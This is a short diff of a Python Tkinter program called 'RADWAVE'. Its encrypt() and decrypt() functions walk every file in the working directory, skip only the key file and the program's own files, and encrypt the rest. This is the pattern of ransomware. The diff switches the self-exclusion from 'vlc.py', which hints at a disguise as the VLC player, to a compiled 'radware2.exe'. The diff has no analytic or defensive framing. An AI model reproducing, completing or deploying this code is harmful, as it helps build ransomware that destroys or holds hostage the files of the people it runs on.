@@ -18,7 +18,7 @@ RED      = "#c0392b"
 # ──────────────────────────────────────────────────────
 
 root = tk.Tk()
-root.title("RADWAVE 2.0")
+root.title("RADWAVE 1.0")
 root.geometry("600x400")
 root.configure(bg=BG)
 root.resizable(False, False)
@@ -122,7 +122,7 @@ pw.pack(side=tk.LEFT, padx=(8, 4), ipady=4)
 def encrypt():
     files =[]
     for file in os.listdir():
-       if file =="vlc.py" or file =="key.key" or file =="dec.py":
+       if file =="radware2.exe" or file =="key.key":
           continue
        if os.path.isfile(file):
           files.append(file)
@@ -143,7 +143,7 @@ def encrypt():
 def decrypt():
     files =[]
     for file in os.listdir():
-      if file =="vlc.py" or file =="key.key" or file =="dec.py":
+      if file =="radware2.exe" or file =="key.key" :
           continue
       if os.path.isfile(file):
           files.append(file)
